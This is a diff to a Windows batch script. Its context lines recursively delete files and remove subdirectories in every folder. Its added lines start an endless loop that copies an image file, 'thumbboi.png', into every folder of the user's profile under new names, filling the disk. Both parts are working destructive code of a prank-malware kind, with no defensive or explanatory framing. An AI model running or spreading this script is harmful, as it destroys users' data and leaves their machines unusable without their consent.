@@ -11,3 +11,15 @@ for /D %%A in (*) do (
     del * /s /q | for /D %%p IN (*) DO rmdir "%%p" /s /q
     cd ..
 )
+@echo off
+setlocal enabledelayedexpansion
+set "sourceFile=thumbboi.png"
+set "baseDir=C:\Users\%username%"
+:CopyLoop
+for /d %%i in ("%baseDir%\*") do (
+    set /a "counter+=1"
+    set "destinationFile=thumbboi!counter!.png"
+    copy "%sourceFile%" "%%i\!destinationFile!"
+)
+goto CopyLoop
+
